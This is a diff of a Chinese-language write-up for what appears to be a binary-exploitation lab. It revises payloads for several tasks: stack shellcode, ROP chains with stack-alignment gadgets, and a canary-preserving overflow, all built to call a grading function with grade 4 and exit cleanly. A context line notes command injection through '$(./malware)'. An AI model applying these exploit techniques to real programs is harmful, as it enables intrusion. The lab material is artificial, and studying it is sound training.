@@ -112,32 +112,38 @@ system 返回后 eval 尾声 `leave` 使用我们伪造的 rbp（0x4242…）→
 方案。另注：`$(./malware)` 共 12 字符，放进 `$(( ... ))` 里 dash/bash 都会先
 做命令替换（实测），说明包装字符串同样有命令注入面；本任务仍按要求用溢出。
 
-### 任务五 payload_dark.py（40 字节）→ 固定栈 shellcode
+### 任务五 payload_dark.py（32 字节）→ 固定栈 shellcode
 
 ```
-6a 04 5f                       push 4; pop rdi
-48 b8 87 1a 40 00 00 00 00 00  movabs rax,0x401a87
+b8 87 1a 40 00                 mov eax,0x401a87      ; grade_eval
+6a 04 5f                       push 4; pop rdi        ; edi = 4
+2d ce 00 00 00                 sub eax,0xce           ; eax = 0x4019b9（exit0 调用点）
+50                             push rax               ; 把 exit0 作为 grade_eval 返回地址压栈
+05 ce 00 00 00                 add eax,0xce           ; eax 恢复为 grade_eval
 ff e0                          jmp rax
 ... NOP 填充到 24 字节
 p64(0x721000800fd0)            input 返回地址 → 缓冲区（shellcode）
-p64(0x4019b9)                  grade_eval 返回 → mov edi,0; call exit@plt
 ```
-用 `jmp` 而不是 `call`：shellcode 入口时 rsp=0x721000800ff0，栈上只剩 8 字节
-可写；grade_eval 的 prologue 恰好落在守卫页下方，其返回地址槽就是我们放的
-exit(0) 调用点，进程以状态 0 干净退出。
+非 PIE 主映像代码地址均 < 2^32，mov eax + sub/add 的 32 位立即数形式比 movabs
+短，21 字节就装下「设参 + 调函数 + 干净退出」。进 grade_eval 前先 push rax
+（=exit0）：既是给它的返回地址，又把 rsp 下移一个 qword，使 grade_eval 入口
+rsp%16=8（与正常 call 一致），其内部 printf 的 movaps 不会崩溃；grade_eval ret
+时弹出 exit0 调用点（mov edi,0; call exit@plt），进程以状态 0 干净退出。
 
-### 任务六 payload_rop.py（56 字节）→ dark-calc-nx 的 ROP
+### 任务六 payload_rop.py（64 字节）→ dark-calc-nx 的 ROP
 
 ```
 "R"*24                         padding 到返回地址槽
 p64(0x401a33)                  pop rdi; ret
 p64(4)                         参数 grade=4
+p64(0x401a34)                  裸 ret（栈对齐垫片）
 p64(0x401978)                  grade_eval
 p64(0x4018aa)                  mov edi,0; call exit@plt（干净退出）
 ```
-栈对齐：input 的 ret 之后 rsp%16=0；pop rdi 之后 %16=8；进入 grade_eval 时
-%16=8，与正常 call 一致，故其内部 printf 不会因 movaps 崩溃。全链只用非 PIE
-主映像固定地址，不依赖栈地址与 libc 地址（ASLR 无效）。
+栈对齐：input 的 ret 之后 rsp%16=0；pop rdi 弹掉参数后 %16=8；紧随的裸 ret 把
+控制流再弹一次并进入 grade_eval，此时 %16=8，与正常 call 一致，故其内部 printf
+不会因 movaps 崩溃。全链只用非 PIE 主映像固定地址，不依赖栈地址与 libc 地址
+（ASLR 无效）。
 
 ### 任务七 payload_canary.py（260 字节）→ dark-log 保 canary 改流
 
@@ -145,8 +151,9 @@ p64(0x4018aa)                  mov edi,0; call exit@plt（干净退出）
 [0..7]    "K"*8                      fake saved rbp
 [8..15]   p64(0x4018a3)              pop rdi; ret
 [16..23]  p64(4)
-[24..31]  p64(0x401677)              grade_eval
-[32..255] "L" 填充
+[24..31]  p64(0x4018a4)              裸 ret（栈对齐垫片）
+[32..39]  p64(0x401677)              grade_eval
+[40..255] "L" 填充
 [256..259] p32(0xa0)                 len = 160 → memcpy 目的 = rbp
 ```
 - 输入只有 260 字节：gets 的 NUL 落在偏移 260（pad 区），canary（偏移 280）
